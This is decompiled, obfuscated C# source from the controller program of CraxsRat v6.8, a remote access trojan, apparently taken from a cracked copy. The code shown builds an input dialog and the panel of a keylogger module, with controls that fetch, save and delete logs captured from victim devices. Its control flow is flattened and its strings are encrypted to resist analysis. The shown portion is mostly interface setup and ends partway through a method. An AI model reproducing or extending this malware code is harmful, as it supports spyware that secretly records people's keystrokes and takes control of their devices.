// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.inp
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class inp : Form
  {
    internal virtual Panel Panel1
    {
      get => ((LocationManager) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.Panel1_Paint);
label_1:
        int num1 = 2130070011;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Panel panel1;
          switch ((num3 = (uint) (-2006228633 - 98878924 - ((num2 ^ -1129367391 * (~-188800544 * 1654403541 + (-(-1921493940 - 1029762003) + (--51002176 - (72822324 ^ -315630349)))) ^ -~((1781305344 ^ -681577970) - (-194452442 ^ -1358348952))) * -2087139393 - ((1030681979 ^ 1453973602) - 775534522)) - 691639914)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              panel1 = ((LocationManager) this)._Panel1;
              num1 = (int) num3 * 1129385651 ^ 1964393173;
              continue;
            case 2:
              panel1.Paint -= paintEventHandler;
              num1 = (int) num3 * 912217598 ^ -1295212835;
              continue;
            case 3:
              ((LocationManager) this)._Panel1 = value;
              num1 = 597251556;
              continue;
            case 4:
              int num4 = panel1 == null ? -2029700343 : (num4 = -804984856);
              num1 = num4 ^ (int) num3 * -295774894;
              continue;
            case 5:
              goto label_1;
            case 6:
              panel1 = ((LocationManager) this)._Panel1;
              int num5 = panel1 == null ? 220967000 : (num5 = 1402549311);
              num1 = num5 ^ (int) num3 * -1849013289;
              continue;
            case 7:
              panel1.Paint += paintEventHandler;
              num1 = (int) num3 * 505454233 ^ -1149202379;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label LTitle
    {
      get => ((LocationManager) this)._LTitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._LTitle = value;
    }

    internal virtual Panel BOXX
    {
      get => ((LocationManager) this)._BOXX;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((LocationManager) this)._BOXX = value;
    }

    internal virtual CheckBox CheckHidden
    {
      get => ((LocationManager) this)._CheckHidden;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((LocationManager) this)._CheckHidden = value;
      }
    }

    internal virtual CheckBox CheckFolder
    {
      get => ((LocationManager) this)._CheckFolder;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((LocationManager) this)._CheckFolder = value;
      }
    }

    internal virtual Timer TOpacity
    {
      get => ((Microphone) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = -609281053;
        Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(--((num1 + ~-(1171873603 * ~(-1330254089 * -456812711))) * 923897179) - (-1204735052 - -34380971))) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = topacity == null ? -1777384512 : (num3 = -567045278);
              num1 = num3 ^ (int) num2 * -1001324480;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num4 = topacity == null ? -1789465170 : (num4 = -22305030);
              num1 = num4 ^ (int) num2 * -897967201;
              continue;
            case 4:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -643947044 ^ 1020035184;
              continue;
            case 5:
              topacity = ((Microphone) this)._TOpacity;
              num1 = (int) num2 * 740172293 ^ -664890584;
              continue;
            case 6:
              topacity = ((Microphone) this)._TOpacity;
              num1 = (int) num2 * -434341283 ^ -1688531936;
              continue;
            case 7:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * -1554628217 ^ 1033394104;
              continue;
            case 8:
              ((Microphone) this)._TOpacity = value;
              num1 = -663087229;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUITextBox InputText
    {
      get => ((Microphone) this)._InputText;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Microphone) this)._InputText = value;
    }

    internal virtual DrakeUIButtonIcon b_ok
    {
      get => ((Microphone) this)._b_ok;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.B_ok_Click_1);
        DrakeUIButtonIcon bOk = ((Microphone) this)._b_ok;
label_1:
        int num1 = -243037769;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~((-~(616635745 - -2032271671 - (1780038787 - 524604969)) - ~(~(-1554142893 - 1498263713) + ~(451405834 ^ 1052231113)) - num2) * 2019938343 ^ -2072715201 * -763698529) - (-1536453191 - -597315105) ^ -1669812284)) % 6U)
          {
            case 0:
              bOk.Click += eventHandler;
              num1 = (int) num3 * -307193152 ^ -1895546362;
              continue;
            case 1:
              ((Microphone) this)._b_ok = value;
              bOk = ((Microphone) this)._b_ok;
              int num4;
              num1 = num4 = bOk == null ? -1533652090 : (num4 = 437553191);
              continue;
            case 2:
              int num5 = bOk == null ? -850042044 : (num5 = -1267496838);
              num1 = num5 ^ (int) num3 * -1837004224;
              continue;
            case 3:
              bOk.Click -= eventHandler;
              num1 = (int) num3 * 1332116082 ^ -2092177498;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    private void translateme()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u00321192D20, false) == 0)
        goto label_7;
label_1:
      int num1 = 1569518959;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((((num1 ^ ~~(-966590291 * (2012612232 + 1581668896)) ^ ((1469600846 ^ 947006175) - 2069001036) * 1076172957 + (94316941 * (613282966 + 1520124944) + (-1476817521 ^ 672113596) * 1633398837)) + -~~(1381871246 - -2014365652)) * 1509814939 ^ -1959453133 ^ 1828647147 - 1854192449) - 361493034)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            int num3 = Operators.CompareString(language, EXGuarder.\u003611E4234, false) != 0 ? 1204691598 : (num3 = -1899971066);
            num1 = num3 ^ (int) num2 * -1473602784;
            continue;
          case 3:
            goto label_7;
          case 4:
            num1 = (int) num2 * 259074942 ^ 1043679404;
            continue;
          case 5:
            this.CheckFolder.Text = Codes.Translate(this.CheckFolder.Text, EXGuarder.\u0035C65746E, EXGuarder.\u0034A1E2361);
            num1 = (int) num2 * 829381445 ^ -1474621466;
            continue;
          case 6:
            this.CheckHidden.Text = Codes.Translate(this.CheckHidden.Text, EXGuarder.\u0035C65746E, EXGuarder.\u0034A1E2361);
            num1 = (int) num2 * -597529869 ^ -523716188;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_7:
      this.CheckHidden.Text = Codes.Translate(this.CheckHidden.Text, EXGuarder.\u0035C65746E, EXGuarder.\u00350402A42);
      this.CheckFolder.Text = Codes.Translate(this.CheckFolder.Text, EXGuarder.\u0035C65746E, EXGuarder.\u00350402A42);
      num1 = -985086002;
      goto label_2;
    }

    public inp()
    {
      this.Load += new EventHandler(this.inp_Load);
      ((Microphone) this).RectInputText0 = new List<Rectangle>();
      // ISSUE: reference to a compiler-generated method
      ((information._Closure\u0024__) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = 1692488510;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~~-((-1963592697 * (453556960 ^ 2133794540 - 834107217 + ~2037935874 - 737091975) - num2 ^ ~~(-2093951159 * (1965227588 ^ -854626169))) - (1940111867 * -140019473 + (1643886506 - -1143998379) ^ 993276295 - -964555635 - ~151007212))) % 4U)
        {
          case 0:
            goto label_5;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            this.Opacity += 0.1;
            num1 = (int) num3 * -1830629242 ^ 867812590;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 1306811948;
      goto label_2;
    }

    private void inp_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u00344367017);
label_1:
      int num1 = 113856801;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~(~num1 - (((-1153124374 ^ 1566018482) * -1864302529 ^ ~(1101888778 - 1637439487)) + 1944057085 * -(76597411 * 863339891)) + --1382149618)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.translateme();
            this.TOpacity.Interval = Settings.T_Interval;
            num1 = (int) num2 * 788548769 ^ -595183797;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      this.TOpacity.Enabled = true;
    }

    private void b_ok_Click(object sender, EventArgs e) => this.DialogResult = DialogResult.OK;

    private void Panel1_Paint(object sender, PaintEventArgs e)
    {
      e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
label_1:
      int num1 = 1123406124;
      Color defaultColorForeground;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~-(num1 - (-332884598 - ~(-1233020397 * ~923026999) + 1314480435 * ~-187913725))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            num1 = (int) num2 * -1449987139 ^ -1554560749;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      if (((Microphone) this).RectInputText0.Count <= 0)
        return;
      List<Rectangle>.Enumerator enumerator;
      try
      {
        enumerator = ((Microphone) this).RectInputText0.GetEnumerator();
label_12:
        int num3 = enumerator.MoveNext() ? 1202235192 : (num3 = 550309670);
        Rectangle current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) -~-(num3 - (-332884598 - ~(-1233020397 * ~923026999) + 1314480435 * ~-187913725))) % 5U)
          {
            case 0:
              goto label_12;
            case 1:
              goto label_9;
            case 2:
              e.Graphics.FillRectangle((Brush) new SolidBrush(defaultColorForeground), current);
              num3 = (int) num4 * -1872208346 ^ 227936480;
              continue;
            case 3:
              num3 = 1202235192;
              continue;
            case 4:
              current = enumerator.Current;
              int num5;
              num3 = num5 = current.Width <= 0 ? 158612026 : (num5 = 848045849);
              continue;
            default:
              goto label_3;
          }
        }
label_9:
        return;
label_3:;
      }
      finally
      {
        enumerator.Dispose();
      }
    }

    private void B_ok_Click_1(object sender, EventArgs e) => this.DialogResult = DialogResult.OK;

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -2059949036;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(((~~301671002 - (-((~-339668053 ^ -80313599 ^ 2122067020) - 1883487622 - -1154038605) - num2) ^ ~992282040) - (1754717793 - 439939652 ^ -22550926 - 1088839480)) * -1490659819)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Microphone) this).components.Dispose();
              num1 = (int) num3 * 1552708811 ^ 1206000610;
              continue;
            case 2:
              int num4 = ((Microphone) this).components == null ? -856884653 : (num4 = -1155179535);
              num1 = num4 ^ (int) num3 * 380634237;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((Microphone) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = -974301180;
      DataGridViewCellStyle gridViewCellStyle1;
      DataGridViewCellStyle gridViewCellStyle2;
      DataGridViewCellStyle gridViewCellStyle3;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-~num1 ^ 1791222375) * 1776672593 ^ -2028144168 - 617737602)) % 269U)
        {
          case 0:
            ((Keylogger) this).deleteallbtn.Location = new Point(653, 0);
            ((Keylogger) this).deleteallbtn.Name = EXGuarder.\u00321325C2A;
            num1 = (int) num2 * -881988563 ^ 2056521088;
            continue;
          case 1:
            ((Keylogger) this).deleteallbtn.Dock = DockStyle.Right;
            num1 = (int) num2 * 1786677472 ^ 1802694336;
            continue;
          case 2:
            ((Keylogger) this).Panel2 = new Panel();
            num1 = (int) num2 * 198623768 ^ -1269662422;
            continue;
          case 3:
            ((Keylogger) this).savedbtn.Font = new Font(EXGuarder.\u003250A4D25, 9f);
            ((Keylogger) this).savedbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1924987500 ^ -1101852930;
            continue;
          case 4:
            ((Keylogger) this).keytabs.TabSelectedColor = Color.Black;
            ((Keylogger) this).keytabs.TabSelectedForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Keylogger) this).keytabs.TabSelectedHighColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1939960481 ^ 718922648;
            continue;
          case 5:
            ((Keylogger) this).clearsrchbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 637966891 ^ -724595292;
            continue;
          case 6:
            ((Keylogger) this).DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1064183758 ^ 1903443652;
            continue;
          case 7:
            ((Keylogger) this).loadinglogs.BackColor = Color.Transparent;
            ((Keylogger) this).loadinglogs.Dock = DockStyle.Right;
            num1 = (int) num2 * 1333755898 ^ 244771848;
            continue;
          case 8:
            ((Keylogger) this).ClientPic.Name = EXGuarder.\u0032F5E3678;
            num1 = (int) num2 * -535365540 ^ 859912508;
            continue;
          case 9:
            ((Keylogger) this).getbtn = new Button();
            num1 = (int) num2 * 570339897 ^ 1623288100;
            continue;
          case 10:
            ((Keylogger) this).loadinglogs.Location = new Point(623, 0);
            num1 = (int) num2 * -1356054698 ^ 2008384785;
            continue;
          case 11:
            ((Keylogger) this).loadinglogs.Name = EXGuarder.\u0036C23661C;
            num1 = (int) num2 * 458494967 ^ 104368510;
            continue;
          case 12:
            goto label_1;
          case 13:
            ((Keylogger) this).backallbtn.Text = EXGuarder.\u003454D2732;
            num1 = (int) num2 * 644235402 ^ 1108096401;
            continue;
          case 14:
            ((Keylogger) this).exitbtn.Text = EXGuarder.\u0034104006A;
            ((Keylogger) this).DrakeUIButtonIcon1.BackColor = Color.Transparent;
            num1 = (int) num2 * 1742238123 ^ 1078426975;
            continue;
          case 15:
            ((Keylogger) this).clinameinfo.Location = new Point(32, 0);
            ((Keylogger) this).clinameinfo.Margin = new Padding(2, 0, 2, 0);
            ((Keylogger) this).clinameinfo.Name = EXGuarder.\u00349676742;
            num1 = (int) num2 * -1423035017 ^ -2037397396;
            continue;
          case 16:
            gridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * 22863626 ^ -841600119;
            continue;
          case 17:
            ((Keylogger) this).exitbtn.SymbolSize = 0;
            ((Keylogger) this).exitbtn.TabIndex = 49;
            num1 = (int) num2 * 2099507762 ^ -874352887;
            continue;
          case 18:
            ((Keylogger) this).deleteallbtn.Size = new Size(74, 33);
            num1 = (int) num2 * -71489203 ^ -630814186;
            continue;
          case 19:
            ((Keylogger) this).delbtn.FlatStyle = FlatStyle.Flat;
            ((Keylogger) this).delbtn.Font = new Font(EXGuarder.\u003250A4D25, 9f);
            num1 = (int) num2 * 1501512039 ^ -1261711509;
            continue;
          case 20:
            ((Keylogger) this).Column2.Name = EXGuarder.\u0030C0D5A72;
            num1 = (int) num2 * -1375960138 ^ -1925555687;
            continue;
          case 21:
            ((Keylogger) this).DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            ((Keylogger) this).DGV0.Size = new Size(856, 407);
            ((Keylogger) this).DGV0.TabIndex = 4;
            num1 = (int) num2 * -535050178 ^ 1609033246;
            continue;
          case 22:
            ((Keylogger) this).keytabs.StyleCustomMode = true;
            num1 = (int) num2 * -1312239014 ^ -498569850;
            continue;
          case 23:
            ((Keylogger) this).Panel2.Location = new Point(0, 0);
            num1 = (int) num2 * 1645355312 ^ -792214658;
            continue;
          case 24:
            ((Keylogger) this).DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * 1605520633 ^ -660723992;
            continue;
          case 25:
            ((Keylogger) this).DGV0.Name = EXGuarder.\u0031C755A6E;
            ((Keylogger) this).DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            num1 = (int) num2 * -303611853 ^ -1058816142;
            continue;
          case 26:
            ((Keylogger) this).savedbtn.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -1078254967 ^ -618536783;
            continue;
          case 27:
            this.AutoScaleDimensions = new SizeF(6f, 12f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(856, 476);
            this.Controls.Add((Control) ((Keylogger) this).keytabs);
            num1 = (int) num2 * -23514293 ^ -906081105;
            continue;
          case 28:
            ((Keylogger) this).searchbtn.AvatarSize = 25;
            num1 = (int) num2 * 328905015 ^ 1012922942;
            continue;
          case 29:
            ((Keylogger) this).keytabs.Controls.Add((Control) ((Keylogger) this).TabPage4);
            ((Keylogger) this).keytabs.Dock = DockStyle.Fill;
            ((Keylogger) this).keytabs.DrawMode = TabDrawMode.OwnerDrawFixed;
            ((Keylogger) this).keytabs.FillColor = Color.Black;
            ((Keylogger) this).keytabs.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            num1 = (int) num2 * 1609570531 ^ -1348670597;
            continue;
          case 30:
            ((Keylogger) this).searchtext.Size = new Size(166, 22);
            num1 = (int) num2 * 288676634 ^ 1559463809;
            continue;
          case 31:
            ((Keylogger) this).clearsrchbtn.FillColor = Color.Black;
            ((Keylogger) this).clearsrchbtn.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            num1 = (int) num2 * -122535529 ^ 1553385591;
            continue;
          case 32:
            ((Keylogger) this).keytabs.Style = UIStyle.Custom;
            num1 = (int) num2 * -1811256109 ^ -464768265;
            continue;
          case 33:
            ((Keylogger) this).DrakeUIButtonIcon1.Dock = DockStyle.Right;
            num1 = (int) num2 * -1386617914 ^ -841879250;
            continue;
          case 34:
            ((Keylogger) this).DrakeUIButtonIcon1.FillSelectedColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * 2057603287 ^ 998311910;
            continue;
          case 35:
            ((Keylogger) this).combologs.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -2071047499 ^ -2114988529;
            continue;
          case 36:
            ((Keylogger) this).clinameinfo.Size = new Size(684, 29);
            ((Keylogger) this).clinameinfo.TabIndex = 12;
            num1 = (int) num2 * -1634306033 ^ 203835585;
            continue;
          case 37:
            ((Keylogger) this).Panel1.Dock = DockStyle.Bottom;
            ((Keylogger) this).Panel1.Location = new Point(0, 374);
            ((Keylogger) this).Panel1.Name = EXGuarder.\u003386D7072;
            num1 = (int) num2 * 992705042 ^ 885689481;
            continue;
          case 38:
            ((Keylogger) this).DrakeUIButtonIcon1.Text = EXGuarder.\u003526C2677;
            ((Keylogger) this).ClientPic.Dock = DockStyle.Left;
            num1 = (int) num2 * -1094013743 ^ 1516079719;
            continue;
          case 39:
            ((Keylogger) this).exitbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -2057792089 ^ 1902370531;
            continue;
          case 40:
            ((Keylogger) this).DGV0.Location = new Point(0, 0);
            num1 = (int) num2 * 554897582 ^ -91536001;
            continue;
          case 41:
            ((Keylogger) this).savedbtn.Location = new Point(801, 0);
            ((Keylogger) this).savedbtn.Name = EXGuarder.\u00362734C38;
            ((Keylogger) this).savedbtn.Size = new Size(55, 33);
            ((Keylogger) this).savedbtn.TabIndex = 5;
            ((Keylogger) this).savedbtn.Text = EXGuarder.\u0034554131E;
            num1 = (int) num2 * 1392311832 ^ -104742277;
            continue;
          case 42:
            ((Keylogger) this).Panel2.SuspendLayout();
            ((ISupportInitialize) ((Keylogger) this).ClientPic).BeginInit();
            this.SuspendLayout();
            num1 = (int) num2 * -353843445 ^ 2033020641;
            continue;
          case 43:
            ((Keylogger) this).searchtext.Font = new Font(EXGuarder.\u003250A4D25, 9f);
            num1 = (int) num2 * -599849366 ^ 1503108419;
            continue;
          case 44:
            ((Keylogger) this).Panel1.Controls.Add((Control) ((Keylogger) this).savedbtn);
            num1 = (int) num2 * -583810464 ^ 2019289892;
            continue;
          case 45:
            ((Keylogger) this).DGV0.DefaultCellStyle = gridViewCellStyle2;
            ((Keylogger) this).DGV0.Dock = DockStyle.Fill;
            num1 = (int) num2 * 398632812 ^ 1529801187;
            continue;
          case 46:
            ((Keylogger) this).clinameinfo.BackColor = Color.Transparent;
            num1 = (int) num2 * 104989606 ^ -1716026333;
            continue;
          case 47:
            ((Keylogger) this).clearsrchbtn.TabIndex = 39;
            ((Keylogger) this).clearsrchbtn.Visible = false;
            num1 = (int) num2 * 365978812 ^ -1950691306;
            continue;
          case 48:
            ((Keylogger) this).loadinglogs.StyleCustomMode = true;
            num1 = (int) num2 * -99595005 ^ 571993577;
            continue;
          case 49:
            ((Keylogger) this).keytabs.Size = new Size(856, 447);
            ((Keylogger) this).keytabs.SizeMode = TabSizeMode.Fixed;
            num1 = (int) num2 * 1664091919 ^ 494254505;
            continue;
          case 50:
            ((Keylogger) this).Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 554356268 ^ -1893751219;
            continue;
          case 51:
            ((Keylogger) this).searchtext.TabIndex = 37;
            num1 = (int) num2 * -785172693 ^ -883368662;
            continue;
          case 52:
            ((Keylogger) this).keytabs.RightToLeft = RightToLeft.No;
            num1 = (int) num2 * 2142390889 ^ -329154155;
            continue;
          case 53:
            ((Keylogger) this).Column3.Name = EXGuarder.\u00347774167;
            num1 = (int) num2 * -503278409 ^ -1004623898;
            continue;
          case 54:
            ((Keylogger) this).Panel3.Location = new Point(0, 0);
            num1 = (int) num2 * -1321984558 ^ -837128563;
            continue;
          case 55:
            ((Keylogger) this).DrakeUIButtonIcon1.FillColor = Color.Transparent;
            num1 = (int) num2 * 1241241883 ^ 273967321;
            continue;
          case 56:
            ((Keylogger) this).clearsrchbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Keylogger) this).clearsrchbtn.Location = new Point(206, 8);
            ((Keylogger) this).clearsrchbtn.Name = EXGuarder.\u00367532E05;
            num1 = (int) num2 * 1048206468 ^ -696280343;
            continue;
          case 57:
            ((Keylogger) this).keytabs.Location = new Point(0, 29);
            ((Keylogger) this).keytabs.MenuStyle = UIMenuStyle.Custom;
            ((Keylogger) this).keytabs.Name = EXGuarder.\u0036C612749;
            num1 = (int) num2 * -1509543147 ^ 1895688023;
            continue;
          case 58:
            ((Keylogger) this).DrakeUIButtonIcon1.Size = new Size(70, 29);
            ((Keylogger) this).DrakeUIButtonIcon1.Style = UIStyle.Custom;
            num1 = (int) num2 * -1422203931 ^ 480298113;
            continue;
          case 59:
            ((Keylogger) this).TabPage4.Controls.Add((Control) ((Keylogger) this).Panel1);
            ((Keylogger) this).TabPage4.Controls.Add((Control) ((Keylogger) this).Button2);
            num1 = (int) num2 * -782261807 ^ 961850492;
            continue;
          case 60:
            this.MinimumSize = new Size(803, 437);
            num1 = (int) num2 * 106848617 ^ 200201769;
            continue;
          case 61:
            ((Keylogger) this).searchbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * -580776791 ^ -552936326;
            continue;
          case 62:
            ((Keylogger) this).exitbtn.FillSelectedColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * 1296478045 ^ 1435302029;
            continue;
          case 63:
            ((Keylogger) this).combologs.RectColor = Color.FromArgb(230, 80, 80);
            num1 = (int) num2 * -1838578435 ^ -1831069802;
            continue;
          case 64:
            ((Keylogger) this).TOpacity.Interval = 1;
            num1 = (int) num2 * 985637802 ^ -1941023829;
            continue;
          case 65:
            ((Keylogger) this).getbtn.FlatStyle = FlatStyle.Flat;
            ((Keylogger) this).getbtn.Font = new Font(EXGuarder.\u003250A4D25, 9f);
            ((Keylogger) this).getbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Keylogger) this).getbtn.Location = new Point(0, 0);
            num1 = (int) num2 * 745336904 ^ 1474226298;
            continue;
          case 66:
            ((Keylogger) this).combologs.Style = UIStyle.Red;
            num1 = (int) num2 * -718250263 ^ 1222436507;
            continue;
          case 67:
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * -238570317 ^ 16426452;
            continue;
          case 68:
            ((Keylogger) this).Button2.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -2000044213 ^ 898969286;
            continue;
          case 69:
            ((Keylogger) this).offlinetext.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 2023710028 ^ 196550096;
            continue;
          case 70:
            ((Keylogger) this).DrakeUIButtonIcon1.Font = new Font(EXGuarder.\u003250A4D25, 12f);
            ((Keylogger) this).DrakeUIButtonIcon1.ForeColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * -1620198635 ^ 295621456;
            continue;
          case 71:
            ((Keylogger) this).DrakeUIButtonIcon1.FillPressColor = Color.Black;
            num1 = (int) num2 * -1093721506 ^ 430206056;
            continue;
          case 72:
            ((Keylogger) this).TabPage4.Controls.Add((Control) ((Keylogger) this).Panel3);
            num1 = (int) num2 * 1348152261 ^ 1819898307;
            continue;
          case 73:
            ((Keylogger) this).ClientPic.Location = new Point(0, 0);
            num1 = (int) num2 * 699199120 ^ 1355279242;
            continue;
          case 74:
            ((Keylogger) this).DGV0.GridColor = Color.FromArgb(42, 42, 42);
            num1 = (int) num2 * -338353984 ^ -1623991944;
            continue;
          case 75:
            ((Keylogger) this).exitbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 540572966 ^ -766183766;
            continue;
          case 76:
            ((Keylogger) this).SaveAsToolStripMenuItem.Text = EXGuarder.\u0036F4D5D2D;
            num1 = (int) num2 * 871654199 ^ 663451190;
            continue;
          case 77:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            gridViewCellStyle1 = new DataGridViewCellStyle();
            ((Keylogger) this).TOpacity = new Timer(((Microphone) this).components);
            num1 = (int) num2 * 2091274204 ^ 607555921;
            continue;
          case 78:
            ((Keylogger) this).DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            num1 = (int) num2 * 2079223091 ^ 1322288979;
            continue;
          case 79:
            ((Keylogger) this).TabPage4 = new TabPage();
            ((Keylogger) this).offlinetext = new RichTextBox();
            ((Keylogger) this).Panel3 = new Panel();
            ((Keylogger) this).clearsrchbtn = new DrakeUIAvatar();
            ((Keylogger) this).searchtext = new DrakeUITextBox();
            num1 = (int) num2 * 2099640472 ^ 1724386068;
            continue;
          case 80:
            ((Keylogger) this).exitbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1084504241 ^ 72876148;
            continue;
          case 81:
            ((Keylogger) this).offlinetext.ForeColor = Color.Lime;
            num1 = (int) num2 * 261662538 ^ -1874400482;
            continue;
          case 82:
            gridViewCellStyle3.WrapMode = DataGridViewTriState.False;
            ((Keylogger) this).DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle3;
            num1 = (int) num2 * 161959486 ^ -830740828;
            continue;
          case 83:
            ((Keylogger) this).TabPage4.SuspendLayout();
            ((Keylogger) this).Panel3.SuspendLayout();
            num1 = (int) num2 * 1557151845 ^ -274494407;
            continue;
          case 84:
            ((Keylogger) this).deleteallbtn.FlatStyle = FlatStyle.Flat;
            ((Keylogger) this).deleteallbtn.Font = new Font(EXGuarder.\u003250A4D25, 9f);
            ((Keylogger) this).deleteallbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -499474666 ^ -488811035;
            continue;
          case 85:
            ((Keylogger) this).backallbtn.UseVisualStyleBackColor = true;
            num1 = (int) num2 * -152009029 ^ 990924248;
            continue;
          case 86:
            ((Keylogger) this).TabPage4.Name = EXGuarder.\u0033A165512;
            num1 = (int) num2 * -1867992535 ^ 1062988961;
            continue;
          case 87:
            ((Keylogger) this).DrakeUIButtonIcon1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1147813658 ^ 483517366;
            continue;
          case 88:
            ((Keylogger) this).DrakeUIButtonIcon1.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * 15939987 ^ 42959857;
            continue;
          case 89:
            ((Keylogger) this).exitbtn.RectHoverColor = Color.White;
            num1 = (int) num2 * 355615310 ^ -1159855539;
            continue;
          case 90:
            ((Keylogger) this).Panel3.ResumeLayout(false);
            ((Keylogger) this).Panel2.ResumeLayout(false);
            ((ISupportInitialize) ((Keylogger) this).ClientPic).EndInit();
            num1 = (int) num2 * 1937192439 ^ -2021779774;
            continue;
          case 91:
            ((Keylogger) this).searchbtn.Symbol = 85;
            ((Keylogger) this).searchbtn.SymbolSize = 30;
            ((Keylogger) this).searchbtn.TabIndex = 38;
            ((Keylogger) this).Panel2.BackColor = Color.Black;
            ((Keylogger) this).Panel2.Controls.Add((Control) ((Keylogger) this).clinameinfo);
            ((Keylogger) this).Panel2.Controls.Add((Control) ((Keylogger) this).exitbtn);
